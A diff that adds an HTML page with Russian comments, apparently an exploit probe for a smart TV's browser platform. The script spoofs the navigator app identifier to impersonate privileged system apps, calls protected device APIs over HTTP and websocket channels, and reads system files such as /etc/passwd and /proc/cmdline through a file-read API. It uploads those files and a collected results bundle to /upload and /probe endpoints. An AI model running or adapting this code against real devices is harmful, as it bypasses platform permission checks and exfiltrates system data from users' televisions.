@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>tv context init</title>
+<style>
+ body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
+ h1{font-size:18px;margin:0 0 8px}
+ #log{white-space:pre-wrap;font-family:monospace;font-size:12px}
+ .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
+</style>
+</head>
+<body>
+<h1>vowOSContext.init и websocket-канал <small class="dim">read-only</small></h1>
+<div id="log"></div>
+<script>
+/* У телевизора свой vowOSContext: {init, getAppIdentifier, getAppId}.
+   Смотрим исходники и что отдают функции, затем пробуем оба канала —
+   HTTP (syncExecute) и websocket (execute) — с подставленным идентификатором. */
+var API = "", out = { ctx: {}, ws: [], http: [], files: [] };
+var FILES = ["/etc/version", "/etc/passwd", "/etc/group", "/proc/version", "/proc/cmdline"];
+
+function log(m, c) {
+  var el = document.getElementById("log"), d = document.createElement("div");
+  if (c) d.className = c; d.textContent = String(m).slice(0, 400); el.appendChild(d);
+}
+function post(p, o, cb) {
+  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
+    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
+}
+function js(v) { try { return JSON.stringify(v).slice(0, 400); } catch (e) { return String(v).slice(0, 200); } }
+function call(a, b) { try { return window.HiUtils_createRequest(a, b); } catch (e) { return { thrown: String(e && e.message || e) }; } }
+
+var C = window.vowOSContext;
+["init", "getAppIdentifier", "getAppId"].forEach(function (n) {
+  try { out.ctx[n + "_src"] = Function.prototype.toString.call(C[n]).slice(0, 800); } catch (e) { out.ctx[n + "_src"] = "err:" + e; }
+  try { out.ctx[n + "_val"] = String(C[n]()); } catch (e) { out.ctx[n + "_val"] = "err:" + (e && e.message || e); }
+});
+log("getAppIdentifier() = '" + out.ctx.getAppIdentifier_val + "'", "dim");
+log("getAppId() = '" + out.ctx.getAppId_val + "'", out.ctx.getAppId_val ? "hit" : "dim");
+log("init(): " + out.ctx.init_val, "dim");
+
+/* подмена геттера на прототипе Navigator */
+var REAL = out.ctx.getAppId_val || out.ctx.getAppIdentifier_val || "";
+function setNav(v) {
+  var r = { tries: [], now: null };
+  try { Object.defineProperty(navigator, "appIdentifier", { get: function () { return v; }, configurable: true }); r.tries.push("instance-get"); } catch (e) { r.tries.push("inst-err"); }
+  r.now = String(navigator.appIdentifier);
+  if (r.now !== String(v)) {
+    try { Object.defineProperty(Object.getPrototypeOf(navigator), "appIdentifier", { get: function () { return v; }, configurable: true }); r.tries.push("proto-get"); } catch (e) { r.tries.push("proto-err"); }
+    r.now = String(navigator.appIdentifier);
+  }
+  return r;
+}
+var navSet = setNav(REAL || "ZQID");
+out.ctx.nav = navSet;
+out.ctx.identAfter = (function () { try { return window.vowOS.service.getIdentifier(); } catch (e) { return "err"; } })();
+log("после подмены: navigator='" + navSet.now + "', getIdentifier='" + out.ctx.identAfter + "' (" + navSet.tries.join(",") + ")", "dim");
+
+/* websocket-канал: execute() с колбэками */
+function wsCall(api, args, cb) {
+  var done = false;
+  var params = { method: "callAPI", parameters: { api: api, args: args === undefined ? "" : args }, timeout: 5,
+    onSuccess: function (m) { if (!done) { done = true; cb({ ok: true, msg: js(m) }); } },
+    onError: function (m) { if (!done) { done = true; cb({ ok: false, msg: js(m) }); } },
+    onComplete: function () {} };
+  try { window.vowOS.service.execute("phoenix://service/hiutils", params); }
+  catch (e) { if (!done) { done = true; cb({ ok: false, error: String(e && e.message || e) }); } }
+  setTimeout(function () { if (!done) { done = true; cb({ ok: null, error: "no reply in 4s" }); } }, 4000);
+}
+
+var IDS = [];
+if (REAL) IDS.push(REAL);
+IDS.push("tv.vidaa.app.browser", "tv.vidaa.res.iot", "");
+var ii = 0;
+(function nextId() {
+  if (ii >= IDS.length) return fileStage();
+  var id = IDS[ii++];
+  setNav(id || "ZQID");
+  var h = call("deviceCode");
+  var hs = js(h), hOk = hs.indexOf("503") < 0 && hs.indexOf("permission") < 0;
+  out.http.push({ id: id, result: hs, ok: hOk });
+  wsCall("deviceCode", "", function (w) {
+    out.ws.push({ id: id, result: w });
+    var wOk = w.ok === true;
+    log(((hOk || wOk) ? "HIT  " : "     ") + (id || "<empty>") + " | http:" + (hOk ? "PASS" : "503") + " | ws:" + (w.ok === null ? w.error : (wOk ? "PASS" : "err")) + " " + String(w.msg || "").slice(0, 90), (hOk || wOk) ? "hit" : "dim");
+    setTimeout(nextId, 200);
+  });
+})();
+
+function fileStage() {
+  var winId = out.http.filter(function (x) { return x.ok; })[0] || null;
+  setNav((winId && winId.id) || REAL || "ZQID");
+  var i = 0;
+  (function one() {
+    if (i >= FILES.length) return finish();
+    var p = FILES[i++], r = call("fileRead", { path: p }), ok = !!(r && r.ret);
+    out.files.push({ path: p, ret: ok, result: ok ? js(r.msg) : js(r) });
+    log((ok ? "ok   " : "err  ") + p + " " + (ok ? "" : js(r).slice(0, 90)), ok ? "ok" : "bad");
+    post("/upload", { path: p, type: "file", strategy: "hiutils/fileRead", status: ok ? "ok" : "error",
+      data: ok ? (typeof r.msg === "string" ? r.msg : JSON.stringify(r.msg)) : null,
+      error: ok ? null : js(r) }, function () { setTimeout(one, 100); });
+  })();
+}
+
+function finish() {
+  out.userAgent = navigator.userAgent;
+  post("/probe", Object.assign({ name: "ctxinit" }, out), function (st) {
+    log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
+  });
+}
+</script>
+</body>
+</html>
